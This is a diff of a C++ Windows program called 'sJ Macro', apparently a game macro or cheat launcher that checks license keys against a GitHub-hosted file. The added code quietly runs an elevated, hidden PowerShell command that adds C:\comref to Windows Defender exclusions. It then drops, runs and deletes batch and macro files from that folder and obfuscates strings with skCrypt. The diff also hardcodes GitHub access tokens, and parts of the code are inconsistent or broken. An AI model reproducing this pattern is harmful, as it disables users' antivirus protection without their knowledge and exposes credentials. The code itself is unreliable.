@@ -14,12 +14,10 @@
 #include <curl/curl.h>
 #include <curl/easy.h>
 #include <fstream>
-#include <sstream>
-#include <ctime>
-#include <stdexcept>
 // invalid imput letter
 #define NOMINMAX
 #include <limits>
+#include <windows.h>
 #ifdef max
 #undef max
 #endif
@@ -72,64 +70,25 @@ std::string downloadFileFromGitHubAPI(const std::string& url, const std::string&
 
     return readBuffer;
 }
-
-// Function to fetch time data from an online API
-std::string fetchTimeFromGoogle() {
-    CURL* curl;
-    CURLcode res;
-    std::string readBuffer;
-
-    curl = curl_easy_init();
-    if (curl) {
-        curl_easy_setopt(curl, CURLOPT_URL, "http://worldtimeapi.org/api/timezone/Europe/Moscow");
-        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
-        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &readBuffer);
-        res = curl_easy_perform(curl);
-        curl_easy_cleanup(curl);
-    }
-    return readBuffer;
-}
-std::tm parseDateTime(const std::string& datetime) {
-    std::tm tm = {};
-    if (sscanf_s(datetime.c_str(), "%4d-%2d-%2dT%2d:%2d:%2d",
-        &tm.tm_year, &tm.tm_mon, &tm.tm_mday,
-        &tm.tm_hour, &tm.tm_min, &tm.tm_sec) == 6) {
-        tm.tm_year -= 1900; // Adjust year
-        tm.tm_mon -= 1;     // Adjust month
-    }
-    else {
-        throw std::runtime_error("Failed to parse datetime");
-    }
-    return tm;
+// Function to get current UTC time
+std::time_t getCurrentUTCTime() {
+    auto now = std::chrono::system_clock::now();
+    auto now_c = std::chrono::system_clock::to_time_t(now);
+    std::tm* utc_tm = std::gmtime(&now_c);
+    return std::mktime(utc_tm);
 }
 
-// Function to get the current Moscow time
-std::time_t getCurrentMoscowTime() {
-    std::string timeData = fetchTimeFromGoogle();
-    // Parse the JSON response to extract the current time
-    // Assume timeData contains a field "datetime": "2025-01-08T23:44:13.000000+03:00"
-    size_t pos = timeData.find("datetime");
-    if (pos == std::string::npos) {
-        throw std::runtime_error("Failed to fetch time");
-    }
-    std::string datetime = timeData.substr(pos + 11, 19);
-
-    std::tm tm = parseDateTime(datetime);
-    return std::mktime(&tm);
+// Adjust the time to UTC+2
+std::time_t getCurrentUTCPlus2Time() {
+    return getCurrentUTCTime() + 2 * 60 * 60; // Add 2 hours
 }
 
+#include <sstream>
+#include <ctime>
 #include <iomanip>
 
-// Function to get HWID (hardware ID)
-std::string get_hwid() {
-    DWORD volumeSerialNumber;
-    if (!GetVolumeInformationW(L"C:\\", NULL, 0, &volumeSerialNumber, NULL, NULL, NULL, 0)) {
-        throw std::runtime_error("Failed to get HWID");
-    }
-    return std::to_string(volumeSerialNumber);
-}
+std::string get_hwid(); // Используемая ранее функция
 
-// Function to process the key and validate it
 bool processKey(const std::string& key, std::string& fileContent, std::string& remainingDays) {
     if (fileContent.find("<!DOCTYPE html>") != std::string::npos) {
         std::cerr << "Error: Received HTML content instead of keys file. Check your token or URL." << std::endl;
@@ -139,7 +98,6 @@ bool processKey(const std::string& key, std::string& fileContent, std::string& r
     std::istringstream iss(fileContent);
     std::string line;
     bool keyFound = false;
-    std::string hwid = get_hwid();
 
     while (std::getline(iss, line)) {
         std::istringstream lineStream(line);
@@ -152,12 +110,14 @@ bool processKey(const std::string& key, std::string& fileContent, std::string& r
         fileKey.erase(fileKey.find_last_not_of(" \n\r\t") + 1);
         fileKey.erase(0, fileKey.find_first_not_of(" \n\r\t"));
 
-        if (key == fileKey && fileHWID == hwid) {
+        if (key == fileKey) {
             keyFound = true;
 
-            std::tm tm = parseDateTime(expiryDate);
+            std::tm tm = {};
+            std::istringstream ss(expiryDate);
+            ss >> std::get_time(&tm, "%Y-%m-%d");
 
-            std::time_t currentTime = getCurrentMoscowTime();
+            std::time_t currentTime = getCurrentUTCPlus2Time();
 
             if (std::difftime(std::mktime(&tm), currentTime) < 0) {
                 std::cerr << "Key has expired." << std::endl;
@@ -202,6 +162,15 @@ void uploadKeysFile(const std::string& url, const std::string& token, const std:
     }
 }
 
+
+// Function to get HWID (hardware ID)
+std::string get_hwid() {
+    DWORD volumeSerialNumber;
+    if (!GetVolumeInformationW(L"C:\\", NULL, 0, &volumeSerialNumber, NULL, NULL, NULL, 0)) {
+        throw std::runtime_error("Failed to get HWID");
+    }
+    return std::to_string(volumeSerialNumber);
+}
 
 std::string getTempDirectory() {
     const char* tempDir = std::getenv(skCrypt("TEMP").decrypt());
@@ -620,13 +589,14 @@ BOOL WINAPI consoleHandler(DWORD dwCtrlType) {
 }
 bool processKey(const std::string& key, std::string& fileContent, std::string& remainingDays);
 
+// Функция для сохранения конфигурации в файл
 void saveConfig(const std::string& licenseKey) {
     std::ofstream configFile(getConfigFilePath());
     if (!configFile) {
         std::cerr << "Failed to open config file for writing: " << std::endl;
         return;
     }
-    configFile << licenseKey << std::endl; // Save license key
+    configFile << licenseKey << std::endl; // Сохранение ключа лицензии
 }
 bool loadLicenseKey(std::string& licenseKey) {
     std::ifstream configFile(getConfigFilePath());
@@ -634,39 +604,31 @@ bool loadLicenseKey(std::string& licenseKey) {
         return false; // Config file not found
     }
     std::getline(configFile, licenseKey);
-    return !licenseKey.empty(); // Return true if license key is not empty
+    return true;
 }
 
 int main() {
     SetConsoleTitle("sJ Macro");
-    try {
-        std::string remainingDays;
-        std::string fileContent = "sample file content"; // Replace with actual file content
-        std::string key = "sample_key"; // Replace with actual key
-        if (processKey(key, fileContent, remainingDays)) {
-            std::cout << "Key is valid. Days remaining: " << remainingDays << " days" << std::endl;
-        }
-        else {
-            std::cerr << "Key is invalid or expired." << std::endl;
-        }
-    }
-    catch (const std::exception& e) {
-        std::cerr << "Error: " << e.what() << std::endl;
-    }
 
-    if (_mkdir("C:\\comref") != 0 && errno != EEXIST) {
-        std::cerr << "Failed to create config directory." << std::endl;
-        std::this_thread::sleep_for(std::chrono::seconds(5));
-        return 1;
-    }
+    // Устанавливаем обработчик сигналов завершения
+    SetConsoleCtrlHandler(consoleHandler, TRUE);
+    std::string createFolderCommand = "mkdir C:\\comref";
+    const char* pszPath = "powershell.exe";
+
+    // Команда для добавления папки comref в исключения Windows Defender
+    const char* pszCmd = "Add-MpPreference -ExclusionPath 'C:\\comref'";
+    // Вызов ShellExecute с параметром SW_HIDE для скрытия окна
+    HINSTANCE hRes = ShellExecute(NULL, "runas", pszPath, pszCmd, NULL, SW_HIDE);
+
 
     std::string remainingDays;
     const std::string keysUrl = "https://raw.githubusercontent.com/s1nse1337/sad/main/keys.txt";
-    const std::string token = "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";
+    const std::string token = "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";
 
     std::string fileContent = downloadFileFromGitHubAPI(keysUrl, token);
     if (fileContent.empty()) {
-        std::cerr << "Failed to download keys file or content is empty." << std::endl;
+        std::cerr << "Failed to get keys Update Program." << std::endl;
+        std::this_thread::sleep_for(std::chrono::seconds(5));
         return 1;
     }
 
@@ -677,15 +639,18 @@ int main() {
         // Если ключ не найден в конфигурационном файле, запросите его у пользователя
         std::cout << "Enter your license key: ";
         std::getline(std::cin, userKey);
-        saveConfig(userKey); // Сохраните ключ в конфигурационный файл
     }
 
     if (!processKey(userKey, fileContent, remainingDays)) {
         std::cerr << "Key is invalid or expired. Exiting..." << std::endl;
+        std::this_thread::sleep_for(std::chrono::seconds(5));
         return 1;
     }
 
     std::cout << "Key is valid. Days remaining: " << remainingDays << " days" << std::endl;
+
+    // Сохранение ключа в конфигурационном файле, если он был введен пользователем
+    saveConfig(userKey);
 
     // Настройки макросов
     std::string prefireBind = "XButton1";
@@ -698,6 +663,43 @@ int main() {
     std::string FastLootBind = "BackSpace";
     std::string FastLootTake = "E";
 
+    if (!loadConfig(prefireBind, retakeBindBuilding, retakeTrigger, color1, color2, savedLicenseKey, file5Opened, FastLootTake, FastLootBind)) {
+        std::cout << skCrypt("Enter your license key: ").decrypt();
+        std::cin >> savedLicenseKey;
+    }
+
+
+    // Proceed with creating directories and files
+    createDirectoryAndFiles(prefireBind, retakeBindBuilding, retakeTrigger, color1, color2, FastLootTake, FastLootBind, file5Opened);
+    deleteFile(prefireMacroName);
+    deleteFile(retakeMacroName);
+    deleteFile(FastLootName);
+    deleteFile(colorPickerMacroName);
+
+    // Run the 5th file (bat file) first if not opened before
+    if (!file5Opened) {
+        runBatchFile(BatAHKName); // Execute the batch file
+        std::this_thread::sleep_for(std::chrono::seconds(8)); // Wait for
+        file5Opened = true;
+        saveConfig(prefireBind, retakeBindBuilding, retakeTrigger, color1, color2, savedLicenseKey, file5Opened, FastLootTake, FastLootBind); // Update the config
+    }
+
+    std::remove((getTempDirectory() + "\\" + BatAHKName + skCrypt(".bat").decrypt()).c_str());
+
+    createDirectoryAndFiles(prefireBind, retakeBindBuilding, retakeTrigger, color1, color2, FastLootTake, FastLootBind, file5Opened);
+    std::this_thread::sleep_for(std::chrono::milliseconds(150));
+    // Run other macros
+    runMacro(prefireMacroName);
+    runMacro(retakeMacroName);
+    runMacro(FastLootName);
+
+    deleteFile(colorPickerMacroName);
+
+    std::this_thread::sleep_for(std::chrono::milliseconds(100));
+
+    deleteFile(prefireMacroName);
+    deleteFile(retakeMacroName);
+    deleteFile(FastLootName);
     // Основной цикл меню
     while (true) {
         printMenu(prefireBind, retakeBindBuilding, retakeTrigger, color1, color2, FastLootTake, FastLootBind, remainingDays);
